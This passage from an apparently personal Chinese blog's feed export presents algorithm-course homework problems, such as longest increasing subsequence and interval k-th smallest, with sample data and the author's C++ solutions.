title="提示"></a>提示</h3><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&amp;&amp;n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> a[n],b[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;b[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(a,a+n);</span><br><span class="line">        sort(b,b+n);</span><br><span class="line">        <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(b[i]&lt;a[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    sum++;</span><br><span class="line">                    a[j]=<span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;=n/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"YES"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"NO"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-I-最长上升子序列"><a href="#问题-I-最长上升子序列" class="headerlink" title="问题 I: 最长上升子序列"></a>问题 I: 最长上升子序列</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个长度为n的字符串S（只包含小写字母），给出q次查询，对于每次查询x，求出以S[x]（下标从0开始）为起始的最长上升子序列的长度（严格增）。</p><h3 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h3><p>第一行两个整数n,q(1&lt;=n,q&lt;=1e5)，意义见题目描述。</p><p>第二行一个长度为n的字符串S。</p><p>第三行q个整数x(0&lt;=x&lt;n)，表示q次查询。</p><h3 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h3><p>输出q个数（以空格分割，行末有空格），表示以S[x]为起始的最长上升子序列的长度。</p><h3 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10 3</span><br><span class="line">abbaaccbbd</span><br><span class="line">2 5 8</span><br></pre></td></tr></table></figure><h3 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3 2 2</span><br></pre></td></tr></table></figure><h3 id="提示-8"><a href="#提示-8" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100010</span>];</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">100010</span>],p[<span class="number">30</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;q;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[i]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=a[i]-<span class="string">'a'</span>+<span class="number">1</span>;j&lt;<span class="number">26</span>;j++)</span><br><span class="line">            ans[i]=max(ans[i],p[j]+<span class="number">1</span>);</span><br><span class="line">        p[a[i]-<span class="string">'a'</span>]=ans[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">while</span>(q--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans[x]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-J-区间第k小"><a href="#问题-J-区间第k小" class="headerlink" title="问题 J: 区间第k小"></a>问题 J: 区间第k小</h2><h3 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h3><p>花花上算法课又偷偷摸鱼。她今天刚学会如何求解区间第k小的数，但是感觉没什么意思。于是她将题目稍稍改动了一下：对于一个长度为n的数列a来说，一共有n*(n+1)/2个子区间，对于数列a的每一个子区间，如果这个子区间的长度小于k，我们不管它，否则把该子区间的第k小的数加入新数列b（初始为空）。花花并不关心数列b里面的元素是什么，她只想知道新数列b中第k小的元素是多少。</p><p>例如，一个长度为4的数列a={5,3,4,9}，当k取3时只有三个子区间长度是&gt;=3的：{5,3,4},{3,4,9}和{5,3,4,9}。分别提取各自的第3小的数加入b数列得到{5,9,5},其中第3小的数为9。</p><h3 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h3><p>第一行两个数n，k（1&lt;=n, k&lt;=1e5)意义见题目描述</p><p>第二行n个数表示数列a中的元素ai。(1&lt;=ai&lt;=1e9)</p><p>数据保证数列b中的元素个数不少于k个</p><h3 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h3><p>输出一个数，表示数列b中的第k小的数</p><h3 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">5 3 4 9</span><br></pre></td></tr></table></figure><h3 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9</span><br></pre></td></tr></table></figure><h3 id="提示-9"><a href="#提示-9" class="headerlink" title="提示"></a>提示</h3><p>二分</p><h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100005</span>;</span><br><span class="line"><span class="keyword">int</span> a[N];</span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">max_position</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> result = <span class="number">0</span>;             </span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = <span class="number">-1</span>, num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (r &lt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (num &lt; k)                   </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[r + <span class="number">1</span>] &lt;= x)num++;</span><br><span class="line">            r++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            result += n - r;</span><br><span class="line">            <span class="keyword">if</span> (a[l] &lt;= x)num--;</span><br><span class="line">            l++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="keyword">int</span>*b=<span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">        b[i] = a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(b, b + n);</span><br><span class="line">    <span class="keyword">int</span> len = unique(b, b + n) - b;    </span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>, r = len - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt;= r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> ret = max_position(b[mid]);</span><br><span class="line">        <span class="keyword">if</span> (ret &gt;= k)        </span><br><span class="line">        &#123;</span><br><span class="line">            ans = b[mid];</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法作业（一）</title>
      <link href="/2019/10/20/%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A1/"/>
      <url>/2019/10/20/%E7%AE%97%E6%B3%95%E4%BD%9C%E4%B8%9A1/</url>
      
        <content type="html"><![CDATA[<p>算法作业一。</p><a id="more"></a><h2 id="问题-A-小雏鸟的成人式-2"><a href="#问题-A-小雏鸟的成人式-2" class="headerlink" title="问题 A: 小雏鸟的成人式 2"></a>问题 A: 小雏鸟的成人式 2</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>陶行知先生说：“我们要活的书，不要死的书 ”。</p><p>小雏鸟们从书上都是对的到现在能去伪存真的去使用书籍，证明你们长大了。总之就是要有自己的主见，自己的思考。</p><p>大白希望大家都能拿到一百分，所以对100这个数以及他的倍数很喜欢。</p><p>大白发现，从1开始，一定能找出一个序列从小到大排列，使得每一项都是 <strong>恰好能且仅能</strong> 被100整除D次。</p><p>请你编写程序，找到这个数列里第N个数。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p> 多行。每行输入两个整数，表示D和N，N范围[1,100]，D范围[0,2] </p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p> 每行对应输入，给出一个符合题意的整数 </p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 5</span><br><span class="line">1 11</span><br><span class="line">2 85</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">1100</span><br><span class="line">850000</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> d,n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;d&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n&gt;=<span class="number">1</span>&amp;&amp;n&lt;<span class="number">100</span>&amp;&amp;d&gt;=<span class="number">0</span>&amp;&amp;d&lt;=<span class="number">2</span>)</span><br><span class="line">            cout&lt;&lt;n*int(pow(100,d))&lt;&lt;endl;   </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(n==<span class="number">100</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="number">101</span>*<span class="keyword">int</span>(<span class="built_in">pow</span>(<span class="number">100</span>,d))&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-小雏鸟的成人式-3"><a href="#问题-B-小雏鸟的成人式-3" class="headerlink" title="问题 B: 小雏鸟的成人式 3"></a>问题 B: 小雏鸟的成人式 3</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>陶行知先生说：“因为道德是做人的根本。根本一坏，纵然使你有一些学问和本领，也无甚用处。”</p><p>小雏鸟们需要时刻铭记在心，不管你长成什么样的的攻城狮，都必须三观正确。</p><p>涛涛轰这一天带着爱美酱来到了一个风景如画的地方游玩。艳阳高照，他俩玩的很尽兴，但是现在他们口渴了。</p><p>涛涛轰：“我要买饮料！”</p><p>店主：“我们这里有三种饮料，矿泉水1.5元一瓶，可乐2元一瓶，橙汁3.5元一瓶。”</p><p>涛涛轰：“好的，给我一瓶矿泉水。”</p><p>说完他掏出一张N元的大钞递给店主。</p><p>店主：“我忘了提醒你了，我们这里没有找客人钱的习惯的，多的钱我们都当小费收了的，嘿嘿。”</p><p>涛涛轰：“……”</p><p>涛涛轰环顾四周，就这一家商店，况且实在太渴了，看着脸热的粉扑扑的一头汗的爱美酱，就决定在这买了。不过涛涛轰想，与其把钱当小费送给他还不如自己多买一点饮料，反正早晚都要喝，但是要尽量少让他赚小费。</p><p>现在涛涛轰希望你能帮他计算一下，最少他要给店主多少小费。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>输入数据的第一行是一个整数T(1&lt;=T&lt;=100)，代表测试数据的数量。然后是T行测试数据，每个测试数据只包含一个正整数N（1&lt;=N&lt;=10000），N代表小明手中钞票的面值，以分为单位。<br>注意：商店里只有题中描述的三种饮料。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>对于每组测试数据，请你输出小明最少要浪费多少钱给店主作为小费，以分为单位。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">900</span><br><span class="line">250</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">50</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">150</span>)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;x&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x&lt;=<span class="number">200</span>||x&gt;<span class="number">300</span>)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;(x%<span class="number">50</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;x<span class="number">-200</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">        test(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-C-大白just大白"><a href="#问题-C-大白just大白" class="headerlink" title="问题 C: 大白just大白"></a>问题 C: 大白just大白</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>大家都知道，大白对学术要求是很严格的。抄作业、考试作弊神马的在大白这简直不能忍。</p><p>这不刚刚过去的期末考试。有n个学生被查出来有问题。</p><p>大白给了他们申辩的机会，每个学生可以提交一段文字，作为申辩理由。但是大白发现来的人总会有一些奇怪的理由。</p><p>大白提前列了m个常见借口关键字。他想看看来申辩的学生中最烂的申辩理由是什么。</p><p>所谓最烂申辩理由就是，申辩里，含有常见借口关键字最多的。</p><p>含有关键字，指的是，理由中出现了一串和关键字完全匹配的字符串，如果出现大写小写不同，也认为匹配。比如，关键字是 bed 理由中出现Bedroom算含有一个关键字。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>一个输入可能有多个case，每个case第一行两个数。分别代表n 和 m</p><p>接下来m行，每行一个关键字（字符串）</p><p>再接下来n行字符串。m和n都不大于20</p><p>每一个借口和借口关键字只会包含大小写字母，长度不会超过4000个字符。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>对于每个case输出一行字符串，表示最烂的理由。若有多个理由包含相同数目的关键字，按输入顺序输出靠前的那个。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2 3</span><br><span class="line">love</span><br><span class="line">cumt</span><br><span class="line">ACM</span><br><span class="line">ILoveCUMTACM</span><br><span class="line">cumtAACM</span><br><span class="line">2 2</span><br><span class="line">A</span><br><span class="line">b</span><br><span class="line">Ab</span><br><span class="line">bA</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ILoveCUMTACM</span><br><span class="line">Ab</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">search</span><span class="params">(<span class="built_in">string</span> str,<span class="built_in">string</span> sub)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>((i = str.find(sub, i)) != <span class="built_in">std</span>::<span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n,k=<span class="number">0</span>,local=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> key[m],ca[n],key1[m],ca1[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;key[i];</span><br><span class="line">            key1[i]=key[i];</span><br><span class="line">            transform(key1[i].begin(),key1[i].end(),key1[i].begin(),::<span class="built_in">tolower</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;ca[i];</span><br><span class="line">            ca1[i]=ca[i];</span><br><span class="line">            transform(ca1[i].begin(),ca1[i].end(),ca1[i].begin(),::<span class="built_in">tolower</span>);</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> 